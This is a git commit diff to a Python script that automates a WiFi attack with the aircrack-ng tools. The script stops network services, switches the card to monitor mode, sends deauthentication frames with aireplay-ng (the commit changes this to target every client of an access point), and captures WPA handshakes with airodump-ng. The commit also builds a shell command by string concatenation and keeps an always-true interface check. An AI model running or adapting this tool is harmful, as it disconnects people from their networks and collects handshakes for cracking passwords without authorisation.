d1a2caea147338cd325af152373017252f0e53d4
root <root@localhost.localdomain>
2018-04-25 13:19:42 -0500

    now works with hardcoded values

--- test2.py
+++ test2.py
@@ -15,33 +15,25 @@ DMAC = "30:3A:64:B0:8B:EB"
 
 def setup_network():
 
-    #out = subprocess.check_output("rm testcap*".split(" "), stderr=subprocess.STDOUT)
-    #out = subprocess.check_output("rm capture*".split(" "))
+    out = subprocess.check_output("service network-manager stop".split(" "))
     out = subprocess.check_output("airmon-ng check kill".split(" "))
-    #print(out)
     out = subprocess.check_output("/etc/init.d/avahi-daemon stop".split(" "))
-    #print(out)
 
     # Get a monitor mode network device from iwconfig
     p2 = subprocess.Popen("iwconfig".split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     out, err = p2.communicate()
     result = err + out
-    #print(result)
     managed = ""
-    #interfaces = [r.split()[0] for r in result.split("\n\n")]
     interfaces = []
     for r in result.split("\n\n"):
         interface = r.split()[0]
         interfaces.append(interface)
         if "Managed" or "Promiscous" in r:
             managed = interface
-    #print(interfaces)
     print("Using {} as the interface".format(managed))
 
     out = subprocess.check_output("ifconfig {} down".format(managed).split(" "))
-    #print(out)
     out = subprocess.check_output("airmon-ng start {}".format(managed).split(" "))
-    #print(out)
     #TODO: programmatically get the new monitor mode network
     mon_managed = managed + "mon"
     return mon_managed
@@ -59,16 +51,19 @@ def send_deauth(bssid, dmac, interface_name, seconds):
     print("sending {0} deauth(s) to DMAC:{1} in BSSID:{2}".format(seconds, dmac, bssid["BSSID"]))
     print("aireplay-ng -0 {0} -a {1} -c {2} {3}".format(seconds, bssid["BSSID"], dmac, interface_name))
     #aireplay-ng -0 1 -a <bssid - MAC address of access point> -c <dmac - MAC address of destination> <monitor mode adapter>
-    p = subprocess.Popen("aireplay-ng -0 {0} -a {1} -c {2} {3}".format(seconds, bssid["BSSID"], dmac, interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    out, err = p.communicate()
-    p.wait()
-    print(out, err)
+    cmd = "aireplay-ng -0 " + str(seconds) + " -a " + bssid["BSSID"] + " " + interface_name
+    subprocess.call(cmd, shell=True)
+    #p = subprocess.Popen("aireplay-ng -0 {0} -a {1} -c {2} {3}".format(seconds, bssid["BSSID"], dmac, interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    #out, err = p.communicate()
+    #p.wait()
+    #print(out, err)
 
 def capture_handshake(bssid, interface_name):
     out = subprocess.check_output("airmon-ng start {0} {1}".format(interface_name, 9).split(" "))
     print("Capturing packets for {0} on channel {1} [BSSID: {2}]..."\
             .format(bssid["ESSID"], bssid["CH"], bssid["BSSID"]))
     print("airodump-ng -c {0} --bssid {1} -w handshake {2}".format(bssid["CH"], bssid["BSSID"], interface_name))
+    #os.system("airodump-ng --bssid %s --channel %s -w captured_packet %s" %(bssid["BSSID"], bssid["CH"], interface_name))
     p = subprocess.Popen("airodump-ng -c {0} --bssid {1} -w handshake {2}"\
             .format(bssid["CH"], bssid["BSSID"], interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     """
